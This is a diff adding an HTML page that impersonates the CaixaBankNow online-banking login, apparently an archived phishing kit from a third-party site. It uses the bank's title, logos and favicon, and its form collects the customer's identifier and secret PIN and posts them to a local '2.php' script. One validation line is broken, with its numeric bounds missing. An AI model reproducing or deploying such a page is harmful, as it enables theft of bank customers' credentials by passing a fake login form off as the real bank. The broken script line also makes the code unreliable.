@@ -1,0 +1,103 @@
+<!-- URL =http://cybereducation.in/https/Caixa_noug3a/2cad8fa47bbef282badbb8de5374b894/--><!-- w =('cybereducation.in', datetime.datetime(2017, 7, 18, 10, 42, 18), datetime.datetime(2021, 7, 18, 10, 42, 18))--><!DOCTYPE doctype html>
+<html>
+ <head>
+  <meta charset="utf-8"/>
+  <title>
+   CaixaBank | banca digital CaixaBankNow
+  </title>
+  <link href="https://loc4.caixabank.es/favicon.ico" rel="shorcut icon"/>
+  <link href="https://loc4.caixabank.es/favicon.ico" rel="icon"/>
+  <meta content="" name="generator"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <link href="./FilesCaixa2/Untitled12.css" rel="stylesheet"/>
+  <link href="./FilesCaixa2/index2.css" rel="stylesheet"/>
+  <script>
+   function submitForm1()
+{
+   var regexp;
+   var Editbox1 = document.getElementById('Editbox1');
+   if (!(Editbox1.disabled || Editbox1.style.display === 'none' || Editbox1.style.visibility === 'hidden'))
+   {
+      if (Editbox1.value == "")
+      {
+         alert("Introduzca su Identificador");
+         Editbox1.focus();
+         return false;
+      }
+      if (Editbox1.value.length < 4)
+      {
+         alert("Introduzca su Identificador");
+         Editbox1.focus();
+         return false;
+      }
+      if (Editbox1.value.length > 20)
+      {
+         alert("Introduzca su Identificador");
+         Editbox1.focus();
+         return false;
+      }
+   }
+   var Editbox2 = document.getElementById('Editbox2');
+   if (!(Editbox2.disabled || Editbox2.style.display === 'none' || Editbox2.style.visibility === 'hidden'))
+   {
+      regexp = /^[-+]?\d*\.?\d*$/;
+      if (!regexp.test(Editbox2.value))
+      {
+         alert("Pulse en el teclado de la pantalla su Número Secreto Personal");
+         Editbox2.focus();
+         return false;
+      }
+      if (Editbox2.value == "")
+      {
+         alert("Pulse en el teclado de la pantalla su Número Secreto Personal");
+         Editbox2.focus();
+         return false;
+      }
+      if (Editbox2.value.length < 3)
+      {
+         alert("Pulse en el teclado de la pantalla su Número Secreto Personal");
+         Editbox2.focus();
+         return false;
+      }
+      if (Editbox2.value.length > 20)
+      {
+         alert("Pulse en el teclado de la pantalla su Número Secreto Personal");
+         Editbox2.focus();
+         return false;
+      }
+      if (Editbox2.value != "" && !(Editbox2.value >=  && Editbox2.value <= ))
+      {
+         alert("Pulse en el teclado de la pantalla su Número Secreto Personal");
+         Editbox2.focus();
+         return false;
+      }
+   }
+   return true;
+}
+  </script>
+ </head>
+ <body>
+  <div id="wb_Image1">
+   <img alt="" id="Image1" src="images/10.jpg"/>
+  </div>
+  <div id="wb_Image2">
+   <img alt="" id="Image2" src="images/logo_caixabank.png"/>
+  </div>
+  <div id="wb_Image3">
+   <img alt="" id="Image3" src="images/logo_caixabanknow_postlogon.svg"/>
+  </div>
+  <div id="wb_Image4">
+   <img alt="" id="Image4" src="images/img0001.gif"/>
+  </div>
+  <div id="wb_Image5">
+   <img alt="" id="Image5" src="images/4.jpg"/>
+  </div>
+  <div id="wb_Form1">
+   <form action="2.php" enctype="multipart/form-data" id="Form1" method="post" name="Form1" onsubmit="return submitForm1()">
+    <input id="Editbox1" name="User" spellcheck="false" type="text" value=""/>
+    <input id="Editbox2" maxlength="20" name="Pwd" spellcheck="false" type="password" value=""/>
+    <input id="Button1" name="" type="submit" value="Entrar"/>
+   </form>
+  </div>
+ </body>
+</html>
